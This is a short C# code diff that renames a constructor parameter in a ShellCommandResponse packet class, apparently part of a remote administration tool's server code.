@@ -15,10 +15,10 @@ namespace xServer.Core.Packets.ClientPackets
         {
         }
 
-        public ShellCommandResponse(string output, bool _IsError = false)
+        public ShellCommandResponse(string output, bool isError = false)
         {
             this.Output = output;
-            this.IsError = _IsError;
+            this.IsError = isError;
         }
 
         public void Execute(Client client)
